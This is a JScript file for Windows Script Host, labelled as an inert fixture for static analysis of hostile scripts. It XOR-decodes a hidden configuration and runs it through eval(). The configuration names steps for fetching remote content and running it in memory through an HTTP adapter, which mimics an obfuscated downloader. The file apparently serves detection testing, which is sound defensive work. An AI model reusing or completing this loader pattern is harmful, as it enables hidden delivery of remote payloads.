// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_4396f6c4 = function(storedMaterial) {
  var keyBytes = [63,68,132,235,47];
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ keyBytes[i % keyBytes.length]); }
  return recoveredMaterial;
};
var recover_85d67408 = function() {
  var packedText = "%44%66%f7%9f%4a%4f%37%a6%d1%74%1d%25%e7%9a%5a%56%36%e1%b4%5d%5a%29%eb%9f%4a%1d%68%a6%8f%46%4c%34%e5%9f%4c%57%1b%e9%8e%42%50%36%fd%c9%72%13%66%e5%8f%4e%4f%30%e1%99%0d%05%66%c9%b8%77%72%08%b6%c5%77%72%08%cc%bf%7b%6f%6a%b2%c5%1f%1d%68%a6%9d%4e%53%31%e1%98%0d%05%3f%a6%88%4e%52%34%e5%82%48%51%1b%ed%8f%0d%05%66%e7%8a%42%4f%25%ed%8c%41%12%7c%bc%d3%4d%07%73%bd%df%19%06%66%a8%c9%5a%4d%28%a6%d1%0d%57%30%f0%9b%5c%05%6b%ab%d3%17%07%26%bc%dc%16%0b%72%bd%c5%4a%47%25%e9%9b%43%5a%6a%ed%85%59%5e%28%ed%8f%00%0a%75%bd%89%4c%08%20%bc%c5%4b%5e%30%a6%c7%0d%4a%37%e1%99%70%5e%23%e1%85%5b%1d%7e%a6%a3%5a%51%30%f6%8e%5c%4c%08%e5%89%00%07%7c%bc%89%17%08%7d%b0%dd%16%1d%39%a8%c9%5c%4b%25%e3%8e%6c%50%31%ea%9f%0d%05%76%f9";

  var storedMaterial = [];

  for (var pi = 0; pi < packedText.length; pi += 3) { storedMaterial.push(parseInt(packedText.substr(pi + 1, 2), 16)); }

  var harmlessValue = (2 > 1) ? "left" : "right";

  var recoveredMaterial = [];

  var pass = 0;

  while (pass < 1) { recoveredMaterial = decode_4396f6c4.call(null, storedMaterial); pass++; }

  var configurationText;

  configurationText = "";

  for (var bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }

  return configurationText;
};
var inspect_99fcdb65 = function() {
  var configuration = eval("(" + recover_85d67408.call(null) + ")");
  var analysisPlan = new Object();
  analysisPlan.steps = configuration.steps;
  analysisPlan.adapter = configuration.adapter;
  analysisPlan.values = configuration.values;
  analysisPlan.stageCount = configuration.stageCount;
  return analysisPlan;
};
